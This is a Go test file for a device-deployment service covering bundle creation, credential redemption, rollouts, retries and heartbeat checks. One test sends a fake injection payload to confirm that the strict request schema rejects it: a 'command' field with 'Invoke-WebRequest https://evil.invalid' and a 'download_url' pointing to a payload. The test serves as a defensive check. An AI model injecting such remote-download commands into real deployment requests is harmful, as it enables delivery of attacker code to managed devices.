package cloudhub

import (
	"bytes"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"
)

func TestTask10DDeploymentHTTPClientAndStrictDTO(t *testing.T) {
	f := newTask10DFixture(t, 5)
	server := httptest.NewServer(NewServer(f.svc))
	defer server.Close()
	client := &Client{BaseURL: server.URL, HTTPClient: server.Client(), Timeout: 5 * time.Second, ActorAccountID: f.owner.ID}

	bundle, err := client.CreateDeploymentBundle(f.ctx, f.bundleRequest(f.owner, 2))
	if err != nil {
		t.Fatalf("CreateDeploymentBundle: %v", err)
	}
	if bundle.Credential == "" || len(bundle.Files) != 3 {
		t.Fatalf("bundle result = %+v", bundle)
	}
	listed, err := client.ListDeploymentBundles(f.ctx, f.org.ID)
	if err != nil || len(listed) != 1 {
		t.Fatalf("ListDeploymentBundles = %+v, %v", listed, err)
	}

	redeemed, err := client.RedeemBootstrapCredential(f.ctx, f.redeemRequest(bundle.Credential, 1))
	if err != nil || redeemed.OrganizationDevice.GroupID != f.group.ID {
		t.Fatalf("RedeemBootstrapCredential = %+v, %v", redeemed, err)
	}
	rollout, err := client.CreateRollout(f.ctx, CreateRolloutRequest{
		OrganizationID: f.org.ID, DeviceIDs: []string{redeemed.Device.ID}, TargetVersion: "0.2.0",
	})
	if err != nil || len(rollout.Targets) != 1 {
		t.Fatalf("CreateRollout = %+v, %v", rollout, err)
	}
	reported, err := client.ReportRolloutTarget(f.ctx, ReportRolloutTargetRequest{
		RolloutID: rollout.Rollout.ID, DeviceID: redeemed.Device.ID, Sequence: 1,
		Status: DeploymentTargetFailed, CurrentVersion: "0.1.0", TargetVersion: "0.2.0", ErrorCode: RolloutErrorApplyFailed,
		Fingerprint: redeemed.Device.Fingerprint,
	})
	if err != nil || reported.Status != DeploymentTargetFailed {
		t.Fatalf("ReportRolloutTarget = %+v, %v", reported, err)
	}
	retried, err := client.RetryRolloutTarget(f.ctx, RetryRolloutTargetRequest{
		OrganizationID: f.org.ID, RolloutID: rollout.Rollout.ID, DeviceID: redeemed.Device.ID,
	})
	if err != nil || retried.Attempt != 2 {
		t.Fatalf("RetryRolloutTarget = %+v, %v", retried, err)
	}
	got, err := client.GetRollout(f.ctx, f.org.ID, rollout.Rollout.ID)
	if err != nil || got.Targets[0].Attempt != 2 {
		t.Fatalf("GetRollout = %+v, %v", got, err)
	}
	if _, err := client.CancelRollout(f.ctx, CancelRolloutRequest{OrganizationID: f.org.ID, RolloutID: rollout.Rollout.ID}); err != nil {
		t.Fatalf("CancelRollout: %v", err)
	}

	malicious, _ := json.Marshal(map[string]any{
		"network_id": f.network.ID, "platform": "windows", "architecture": "amd64", "max_uses": 1,
		"command": "Invoke-WebRequest https://evil.invalid", "download_url": "https://evil.invalid/payload",
	})
	req, _ := http.NewRequest(http.MethodPost, server.URL+"/api/organizations/"+f.org.ID+"/deployment-bundles", bytes.NewReader(malicious))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set(ActorAccountHeader, f.owner.ID)
	resp, err := server.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		t.Fatal("strict deployment DTO accepted command/download_url injection")
	}
}

func TestTask10DHeartbeatReportsRolloutVersionWithoutRegressingCurrent(t *testing.T) {
	f := newTask10DFixture(t, 2)
	bundle, err := f.svc.CreateDeploymentBundle(f.ctx, f.bundleRequest(f.owner, 1))
	if err != nil {
		t.Fatal(err)
	}
	joined, err := f.svc.RedeemBootstrapCredential(f.ctx, f.redeemRequest(bundle.Credential, 1))
	if err != nil {
		t.Fatal(err)
	}
	rollout, err := f.svc.CreateRollout(f.ctx, CreateRolloutRequest{
		ActorAccountID: f.owner.ID, OrganizationID: f.org.ID, DeviceIDs: []string{joined.Device.ID}, TargetVersion: "0.2.0",
	})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.svc.HeartbeatDevice(f.ctx, HeartbeatDeviceRequest{
		DeviceID: joined.Device.ID, Fingerprint: "sha256:wrong-device", Status: DeviceStatusOnline,
	}); err == nil || !errors.Is(err, ErrForbidden) {
		t.Fatalf("wrong identity heartbeat error = %v, want forbidden", err)
	}
	assigned, err := f.svc.HeartbeatDevice(f.ctx, HeartbeatDeviceRequest{
		DeviceID: joined.Device.ID, Fingerprint: joined.Device.Fingerprint, Status: DeviceStatusOnline, CurrentVersion: "9.9.9",
	})
	if err != nil || assigned.CurrentVersion != "0.1.0" || assigned.RolloutID != rollout.Rollout.ID || assigned.TargetVersion != "0.2.0" {
		t.Fatalf("heartbeat rollout assignment = %+v, %v", assigned, err)
	}
	heartbeat, err := f.svc.HeartbeatDevice(f.ctx, HeartbeatDeviceRequest{
		DeviceID: joined.Device.ID, Fingerprint: joined.Device.Fingerprint, Status: DeviceStatusOnline, CurrentVersion: "0.1.0",
		RolloutID: rollout.Rollout.ID, TargetVersion: "0.2.0", VersionStatus: DeploymentTargetFailed,
		VersionSequence: 1, VersionErrorCode: RolloutErrorApplyFailed,
	})
	if err != nil || heartbeat.CurrentVersion != "0.1.0" {
		t.Fatalf("failed update heartbeat = %+v, %v", heartbeat, err)
	}
	target, err := f.svc.GetRolloutTarget(f.ctx, f.owner.ID, f.org.ID, rollout.Rollout.ID, joined.Device.ID)
	if err != nil || target.Status != DeploymentTargetFailed || target.CurrentVersion != "0.1.0" {
		t.Fatalf("target after failed heartbeat = %+v, %v", target, err)
	}
}
